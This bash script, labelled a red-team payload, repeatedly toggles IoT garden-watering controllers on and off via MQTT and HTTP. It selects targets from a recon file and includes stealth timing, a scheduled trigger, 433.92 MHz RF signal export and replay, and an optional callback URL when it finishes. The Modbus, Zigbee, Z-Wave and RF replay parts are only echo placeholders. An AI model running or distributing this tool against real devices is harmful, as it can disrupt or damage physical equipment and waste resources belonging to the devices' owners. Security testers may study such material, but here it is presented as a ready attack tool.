#!/bin/bash

# watering_loop.sh - Red Team Payload: Watering Loop with All Features

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOPS=99999
DELAY=2
MQTT=false
HTTP=false
MODBUS=false
ZIGBEE=false
ZWAVE=false
RF_EXPORT=false
RF_REPLAY=""
STEALTH=false
TRIGGER=""
DASHBOARD=false
KILL_SWITCH="/tmp/watering_loop_kill"
PIDFILE="/tmp/watering_loop.pid"
RF_DIR="rf_exports"
RECON_FILE="recon_results/loop_targets.txt"
CALLBACK_URL=""
TARGETS=()

declare -A RF_SIGNALS
RF_SIGNALS["WATER_ON"]="111000111000"
RF_SIGNALS["WATER_OFF"]="001100110011"

mkdir -p "$RF_DIR"

log_status() {
    if $DASHBOARD; then
        printf "[%s] Target: %s | Protocol: %s | Command: %s\n" "$(date +%H:%M:%S)" "$1" "$2" "$3"
    fi
}

send_command() {
    local target=$1
    local cmd=$2

    if [[ -f "$KILL_SWITCH" ]]; then
        echo -e "${RED}Kill switch detected. Terminating.${NC}"
        rm -f "$PIDFILE"
        exit 1
    fi

    [[ $STEALTH == true ]] && sleep $(awk -v min=1 -v max=4 'BEGIN{srand(); print min+rand()*(max-min)}') || sleep $DELAY

    $MQTT && mosquitto_pub -h "localhost" -t "iot/gardener/water" -m "$target:$cmd" >/dev/null 2>&1 && log_status "$target" "MQTT" "$cmd"
    $HTTP && curl -s -X POST "http://$target/api/water" -d "cmd=$cmd" >/dev/null && log_status "$target" "HTTP" "$cmd"
    $MODBUS && echo "$cmd > $target (MODBUS placeholder)" >/dev/null && log_status "$target" "MODBUS" "$cmd"
    $ZIGBEE && echo "Zigbee: $cmd > $target" >/dev/null && log_status "$target" "ZIGBEE" "$cmd"
    $ZWAVE && echo "Z-Wave: $cmd > $target" >/dev/null && log_status "$target" "ZWAVE" "$cmd"

    if $RF_EXPORT; then
        rf_file="$RF_DIR/watering_loop_$(date +%s)_$target.sub"
        echo "# $cmd" >> "$rf_file"
        echo "frequency=433920000" >> "$rf_file"
        echo "protocol=raw" >> "$rf_file"
        echo "repeats=3" >> "$rf_file"
        echo "raw=${RF_SIGNALS[$cmd]}" >> "$rf_file"
        echo "" >> "$rf_file"
        log_status "$target" "RF_EXPORT" "$cmd"
    fi
}

wait_for_trigger() {
    if [[ -n "$TRIGGER" ]]; then
        echo -e "${YELLOW}Waiting for trigger time: $TRIGGER${NC}"
        while [[ $(date +%H:%M) != "$TRIGGER" ]]; do
            sleep 10
        done
    fi
}

select_targets() {
    if [[ -f "$RECON_FILE" ]]; then
        echo -e "${YELLOW}Available recon targets:${NC}"
        mapfile -t LIST < "$RECON_FILE"
        for i in "${!LIST[@]}"; do
            echo " [$((i+1))] ${LIST[$i]}"
        done
        read -p "Enter comma-separated numbers (e.g., 1,2) or 'm' for manual: " input
        if [[ "$input" == "m" ]]; then
            read -p "Enter target manually: " manual_target
            TARGETS+=("$manual_target")
        else
            IFS=',' read -ra IDX <<< "$input"
            for i in "${IDX[@]}"; do
                [[ "$i" =~ ^[0-9]+$ ]] && TARGETS+=("${LIST[$((i-1))]}")
            done
        fi
    else
        read -p "Enter target manually: " manual_target
        TARGETS+=("$manual_target")
    fi
}

discover_rf_file() {
    echo -e "${YELLOW}Searching for available .sub RF replay files...${NC}"
    shopt -s nullglob
    files=("$RF_DIR"/*.sub)
    if (( ${#files[@]} == 0 )); then
        echo -e "${RED}No RF .sub files found.${NC}"
        exit 1
    fi

    for i in "${!files[@]}"; do
        echo " [$((i+1))] ${files[$i]}"
    done
    read -p "Choose file number to replay: " choice
    RF_REPLAY="${files[$((choice-1))]}"
}

replay_rf_file() {
    echo -e "${GREEN}Replaying signals from $RF_REPLAY...${NC}"
    grep '^raw=' "$RF_REPLAY" | while read -r line; do
        sig=${line#raw=}
        echo "Sending RF signal: $sig"
        sleep $DELAY
    done
    exit 0
}

# Parse arguments
while [[ "$1" != "" ]]; do
    case $1 in
        --mqtt) MQTT=true ;;
        --http) HTTP=true ;;
        --modbus) MODBUS=true ;;
        --zigbee) ZIGBEE=true ;;
        --zwave) ZWAVE=true ;;
        --rf) RF_EXPORT=true ;;
        --replay) discover_rf_file ;;
        --stealth) STEALTH=true ;;
        --dashboard) DASHBOARD=true ;;
        --delay) shift; DELAY=$1 ;;
        --loops) shift; LOOPS=$1 ;;
        --trigger) shift; TRIGGER=$1 ;;
        --kill-switch) KILL=true ;;
        --callback) shift; CALLBACK_URL=$1 ;;
    esac
    shift
done

# Run RF replay only if set
[[ -n "$RF_REPLAY" ]] && replay_rf_file

# Save PID
echo $$ > "$PIDFILE"

select_targets
wait_for_trigger

for target in "${TARGETS[@]}"; do
    echo -e "${GREEN}Launching watering loop on: $target${NC}"
    for ((i=1; i<=$LOOPS; i++)); do
        echo -e "${YELLOW}--- Loop $i for $target ---${NC}"
        send_command "$target" "WATER_ON"
        send_command "$target" "WATER_OFF"
    done
done

[[ -n "$CALLBACK_URL" ]] && curl -s "$CALLBACK_URL" >/dev/null

rm -f "$PIDFILE"
echo -e "${GREEN}Loop finished.${NC}"
